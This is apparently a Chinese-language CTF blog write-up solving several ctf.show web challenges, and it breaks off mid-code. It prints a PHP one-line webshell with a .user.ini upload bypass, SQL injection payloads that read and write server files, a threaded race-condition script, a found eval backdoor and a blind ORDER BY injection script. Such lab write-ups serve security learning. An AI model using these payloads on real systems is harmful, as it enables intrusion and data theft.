+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">	$filename = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];</span><br><span class="line">	$temp_name = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">	$size = $_FILES[&#x27;file&#x27;][&#x27;size&#x27;];</span><br><span class="line">	$error = $_FILES[&#x27;file&#x27;][&#x27;error&#x27;];</span><br><span class="line">	$arr = pathinfo($filename);</span><br><span class="line">	$ext_suffix = $arr[&#x27;extension&#x27;];</span><br><span class="line">	if ($size &gt; 24)&#123;</span><br><span class="line">		die(&quot;error file zise&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	if (strlen($filename)&gt;9)&#123;</span><br><span class="line">		die(&quot;error file name&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	if(strlen($ext_suffix)&gt;3)&#123;</span><br><span class="line">		die(&quot;error suffix&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	if(preg_match(&quot;/php/i&quot;,$ext_suffix))&#123;</span><br><span class="line">		die(&quot;error suffix&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/php/i&quot;),$filename))&#123;</span><br><span class="line">        die(&quot;error file name&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">	if (move_uploaded_file($temp_name, &#x27;./&#x27;.$filename))&#123;</span><br><span class="line">		echo &quot;文件上传成功！&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &quot;文件上传失败！&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>要求文件名中没有php而且后缀名小于等于3</p>
+<p>那基本所有能直接使用的php页面都传不上去了</p>
+<p>而且要文件大小&lt;&#x3D;24，那就只能这么写了<code>&lt;?php eval($_POST[&#39;a&#39;]);</code></p>
+<p>又不能上传.htaccess来解析绕过</p>
+<blockquote>
+<p>对于php中的.user.ini有如下解释：</p>
+<p>PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。也就是在.user.ini中如果设置了文件名，那么任意一个页面都会将该文件中的内容包含进去。<br>我们在.user.ini中输入<code>auto_prepend_file =a.txt</code>，这样在该目录下的所有文件都会包含a.txt的内容</p>
+</blockquote>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ini.core.php#ini.user-ini.cache-ttl">user_ini.cache_ttl</a> 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p>
+</blockquote>
+<p>所以上传之后要等一会才能重新发</p>
+<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = intval($_GET[&#x27;c&#x27;]);</span><br><span class="line">    sleep($c);</span><br><span class="line">    switch ($c) &#123;</span><br><span class="line">        case 1:</span><br><span class="line">            echo &#x27;$url&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 2:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 555555:</span><br><span class="line">            echo $url;</span><br><span class="line">        case 44444:</span><br><span class="line">            echo &quot;@A@&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case 3333:</span><br><span class="line">            echo $url;</span><br><span class="line">            break;</span><br><span class="line">        case 222:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 222:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 3333:</span><br><span class="line">            echo $url;</span><br><span class="line">            break;</span><br><span class="line">        case 44444:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">        case 555555:</span><br><span class="line">            echo $url;</span><br><span class="line">            break;</span><br><span class="line">        case 3:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">        case 6000000:</span><br><span class="line">            echo &quot;$url&quot;;</span><br><span class="line">        case 1:</span><br><span class="line">            echo &#x27;@A@&#x27;;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>都忘了，如果switch case不加break会一直顺序执行，所以传了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=3</span><br></pre></td></tr></table></figure>
+
+<p>之后就会一直执行到echo “$url”;</p>
+<p>进入下一个网页F12有提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/information_schema\.tables|information_schema\.columns|linestring| |polygon/is&#x27;, $_GET[&#x27;query&#x27;]))&#123;</span><br><span class="line">		die(&#x27;@A@&#x27;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>试了一下发现是int注入，直接order by查只有一列，当前数据库为web。而且ban了information_schema.tables。</p>
+<blockquote>
+<p>可以用`information_schema`.`tables`代替information_schema.tables</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?query=-1/**/union/**/select/**/group_concat(table_name)/**/from/**/`information_schema`.`tables`/**/where/**/`table_schema`=&#x27;web&#x27;%23</span><br><span class="line">=&gt;alert(&#x27;content&#x27;)</span><br><span class="line"></span><br><span class="line">?query=-1/**/union/**/select/**/group_concat(column_name)/**/from/**/`information_schema`.`columns`/**/where/**/`table_name`=&#x27;content&#x27;%23</span><br><span class="line">=&gt;alert(&#x27;id,username,password&#x27;)</span><br><span class="line"></span><br><span class="line">?query=-1/**/union/**/select/**/group_concat(id,&#x27;;&#x27;,username,&#x27;;&#x27;,password)/**/from/**/content%23</span><br><span class="line">=&gt;alert(&#x27;1;admin;flag is not here!,2;gtf1y;wow,you can really dance,3;Wow;tell you a secret,secret has a secret...&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>好吧，并没有flag，那就直接试一下load_file读取本地文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?query=-1/**/union/**/select/**/load_file(&quot;/var/www/html/secret.php&quot;)%23</span><br><span class="line">=&gt;alert(&#x27;&lt;!-- ReadMe --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;here_1s_your_f1ag.php&#x27;;</span><br><span class="line">$file = &#x27;/tmp/gtf1y&#x27;;</span><br><span class="line">if(trim(@file_get_contents($file)) === &#x27;ctf.show&#x27;)&#123;</span><br><span class="line">	echo file_get_contents(&#x27;/real_flag_is_here&#x27;);</span><br><span class="line">&#125;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>看一下代码可以再读一下&#x2F;real_flag_is_here</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?query=-1/**/union/**/select/**/load_file(&quot;/real_flag_is_here&quot;)%23</span><br><span class="line">=&gt;alert(&#x27;ctfshow&#123;8eb644ba-4766-41b1-a638-34e2fe5f5312&#125;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>或者从代码里可以看出来要判断$file中是否存在”ctf.show”字符串，也可以通过into outfile函数写文件到&#x2F;tmp&#x2F;gtf1y中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=-1/**/union/**/select/**/&quot;ctf.show&quot;/**/into/**/outfile(&quot;/tmp/gtf1y&quot;)%23</span><br></pre></td></tr></table></figure>
+
+<p>然后直接访问secret.php，也能弹出flag</p>
+<h2 id="红包题第六弹"><a href="#红包题第六弹" class="headerlink" title="红包题第六弹"></a>红包题第六弹</h2><p>扫目录有web.zip泄露，对页面审计发现有主要函数</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function ctfshow(token,data)&#123;</span><br><span class="line"></span><br><span class="line">			var oReq = new XMLHttpRequest();</span><br><span class="line">			oReq.open(&quot;POST&quot;, &quot;check.php?token=&quot;+token+&quot;&amp;php://input&quot;, true);</span><br><span class="line">			oReq.onload = function (oEvent) &#123;</span><br><span class="line">				if(oReq.status===200)&#123;</span><br><span class="line">						var res=eval(&quot;(&quot;+oReq.response+&quot;)&quot;);</span><br><span class="line">						if(res.success ==1 &amp;&amp;res.error!=1)&#123;</span><br><span class="line">							alert(res.msg);</span><br><span class="line">							return;</span><br><span class="line">						&#125;</span><br><span class="line">						if(res.error ==1)&#123;</span><br><span class="line">							alert(res.errormsg);</span><br><span class="line">							return;</span><br><span class="line">						&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				return;</span><br><span class="line">			&#125;;</span><br><span class="line">			oReq.send(data);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结合web.zip中的check.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveStreamFile</span>(<span class="params"><span class="variable">$receiveFile</span></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$streamData</span> = <span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>])? <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$streamData</span>))&#123;</span><br><span class="line">        <span class="variable">$streamData</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$streamData</span>!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$receiveFile</span>, <span class="variable">$streamData</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>)) === <span class="variable">$token</span>)&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$receiveFile</span> = <span class="string">&#x27;flag.dat&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">receiveStreamFile</span>(<span class="variable">$receiveFile</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">md5_file</span>(<span class="variable">$receiveFile</span>)===<span class="title function_ invoke__">md5_file</span>(<span class="string">&quot;key.dat&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">hash_file</span>(<span class="string">&quot;sha512&quot;</span>,<span class="variable">$receiveFile</span>)!=<span class="title function_ invoke__">hash_file</span>(<span class="string">&quot;sha512&quot;</span>,<span class="string">&quot;key.dat&quot;</span>))&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;success&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;人脸识别成功!<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;0&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;same file&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;md5 error&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;token error&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure>
+
+<p>随便传个东西过去发现直接报md5 error，就是md5校验那里没过，再跟踪一下receiveStreamFile函数看一下他在做什么</p>
+<p>$streamData从php:&#x2F;&#x2F;input里接收数据流，然后通过file_put_contents写入到$receiveFile中</p>
+<p>遇到了挺多次的小点，记录一下为什么php:&#x2F;&#x2F;input传不进去文件的问题</p>
+<blockquote>
+<p>php:&#x2F;&#x2F;input可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</p>
+</blockquote>
+<p>而$receiveFile已经写死是flag.dat，那唯一可控的就是传输过去的数据流</p>
+<p>可以直接把key.dat下下来，就可以得到目标文件的data，现在就需要想怎么把本地的key.dat传到服务器里</p>
+<p>那就可以本地给个上传前端（红包题第二弹），然后在bp里稍微改一下data就能绕过md5</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309231940594.png" alt="image-20230923194044472"></p>
+<p>还要把文件尾的回车删掉，这时就能弹出same file的报错。这说明md5相等而且sha512也相等</p>
+<p>这个时候看了网上大部分wp，都说是md5碰撞，但其实不是的。这是<strong>条件竞争</strong></p>
+<p>两个if判断中必然会有时间差，要利用这个时间差把flag.dat再次替换一遍，才可以做到绕过sha512</p>
+<p>如果单纯利用fastcoll，是碰撞不出来和key.dat有相同md5的文件，这也是我看了很久想不明白的点</p>
+<p>而条件竞争通常需要python的多线程操作。这里有特殊字符，bp经常会自动给你加payload导致和源文件不一致，所以使用python的thread模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://d6d06d87-f806-48a0-a282-a653e47e9fb6.challenge.ctf.show/check.php?token=70efdf2ec9b086079795c442636b55fb&amp;php://input&quot;</span><br><span class="line"></span><br><span class="line">def POST(data):</span><br><span class="line">    try:</span><br><span class="line">        r = requests.post(url,data = data)</span><br><span class="line">        print(r.text)</span><br><span class="line">        pass</span><br><span class="line">    except  Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        pass</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">with open(&#x27;key.dat&#x27;,&#x27;rb&#x27;) as k:</span><br><span class="line">    data = k.read()</span><br><span class="line">    pass</span><br><span class="line">for i in range(500):</span><br><span class="line">    threading.Thread(target = POST,args = (data,)).start()</span><br><span class="line">    threading.Thread(target = POST,args = (&quot;test&quot;,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309232231933.png" alt="image-20230923222239758"></p>
+<h2 id="红包题第七弹"><a href="#红包题第七弹" class="headerlink" title="红包题第七弹"></a>红包题第七弹</h2><p>咋一看没东西，扫网发现有git泄露</p>
+<p>用githack失败了，那就换用Git_Extract，把git扒下来，发现有backdoor.php的后门一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@eval($_POST[&#x27;Letmein&#x27;]);</span><br></pre></td></tr></table></figure>
+
+<p>直接进去打，但是禁用的函数太多，没法rce。先连个蚁剑找到flag在&#x2F;var&#x2F;www下</p>
+<p>可以直接用highlight_file显示出来</p>
+<h2 id="萌新专属红包题"><a href="#萌新专属红包题" class="headerlink" title="萌新专属红包题"></a>萌新专属红包题</h2><p>唉，最低能的弱口令。得找个时间把字典好好整理一下了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u=admin&amp;p=admin888</span><br></pre></td></tr></table></figure>
+
+<h2 id="CTFshow-web1"><a href="#CTFshow-web1" class="headerlink" title="CTFshow web1"></a>CTFshow web1</h2><p>扫网发现<a target="_blank" rel="noopener" href="http://www.zip,打开发现连了web15的数据库,函数大概是全禁了/">www.zip，打开发现连了web15的数据库，函数大概是全禁了</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;/group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\`|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\=|\]|\;|\&#x27;|\’|\“|\&quot;|\&lt;|\&gt;|\?/i&quot;,$username))</span><br></pre></td></tr></table></figure>
+
+<p>里边有个user_main.php，但是并不会直接给你放出pwd</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309241734589.png" alt="image-20230924173415512"></p>
+<p>注意得到，执行的sql语句是<code>select * from user order by $order</code>，而order是可以操控的位置，当使用pwd的时候，就会使用pwd来排序。如果密码排序&gt;flag，排序就会靠上。这个时候就得考虑盲注了</p>
+<p>这里给出二分法的payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">regurl = <span class="string">&quot;http://0d2d0247-36d5-4d3e-bb8f-98a64bc16ccd.challenge.ctf.show/reg.php&quot;</span></span><br><span class="line">queurl = <span class="string">&quot;http://0d2d0247-36d5-4d3e-bb8f-98a64bc16ccd.challenge.ctf.show/user_main.php?order=pwd&quot;</span></span><br><span class="line">key = <span class="string">&quot;-0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="comment"># 注册项目</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">0</span></span><br><span class="line">    mid = (<span class="built_in">max</span> + <span class="built_in">min</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> mid &lt; <span class="built_in">max</span>:</span><br><span class="line">        c = key[mid]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;now playload:&quot;</span>, c)</span><br><span class="line">        raw_data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: flag + c,</span><br><span class="line">            <span class="string">&quot;email&quot;</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">            <span class="string">&quot;nickname&quot;</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: flag + c,</span><br><span class="line">        &#125;</span><br><span class="line">        s = requests.session()</span><br><span class="line">        reg = s.post(url = regurl,</span><br><span class="line">                     data = raw_data,</span><br><span class="line">                     headers = &#123;</span><br><span class="line">                         <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=31f1f4341531ede15606ff7a99b5ec08&quot;</span></span><br><span class="line">                     &#125;)</span><br><span class="line">        que = requests.get(url = queurl, headers = &#123;</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=31f1f4341531ede15606ff7a99b5ec08&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        p_t = que.text.index(flag + c)</span><br><span class="line">        p_flag = que.text.index(<span class="string">&quot;flag_is_my_password&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> p_t &gt; p_flag:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">    flag = flag + key[mid - <span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>由于很多&lt;&gt;等特殊符号被禁用了，所以直接指定key。而且mysql排序并不是按ascii码排序。当字母不同，按字母表顺序排列；当同字母，先小写后大写</p>
+<h2 id="game-gyctf-web2"><a href="#game-gyctf-web2" class="headerlink" title="game-gyctf web2"></a>game-gyctf web2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">function safe($parm)&#123;</span><br><span class="line">    $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\&#x27;,&quot;*&quot;,&quot;alter&quot;);</span><br><span class="line">    return str_replace($array,&#x27;hacker&#x27;,$parm);</span><br><span class="line">&#125;</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age=null;</span><br><span class="line">    public $nickname=null;</span><br><span class="line">    public function login() &#123;</span><br><span class="line">        if(isset($_POST[&#x27;username&#x27;])&amp;&amp;isset($_POST[&#x27;password&#x27;]))&#123;</span><br><span class="line">        $mysqli=new 